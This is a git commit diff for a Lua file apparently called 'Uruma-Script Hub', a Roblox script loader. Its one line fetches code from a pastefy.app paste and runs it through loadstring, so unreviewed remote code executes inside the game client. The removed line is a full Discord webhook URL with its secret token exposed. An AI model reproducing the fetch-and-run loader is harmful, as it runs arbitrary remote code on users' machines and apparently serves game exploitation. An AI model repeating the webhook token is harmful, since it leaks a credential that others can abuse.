29e03b47df7e84d8242f86b5512057c72122f25c
BellCranel133 <yuanprinnce@gmail.com>
2025-07-13 07:35:42 +0800

    Uruma-Script%20Hub%20.lua

--- Uruma-Script%20Hub%20.lua
+++ Uruma-Script%20Hub%20.lua
@@ -1,2 +1,1 @@
 loadstring(game:HttpGet("https://pastefy.app/HzQxhrih/raw"))()
-https://discord.com/api/webhooks/1382250906149720114/HPahAVu5lRP5ngjDNsJmxI_DHSh7FRxUfPI94ITsV8BQZ2mybPZHVuZEeQ2jVHkbjI-e
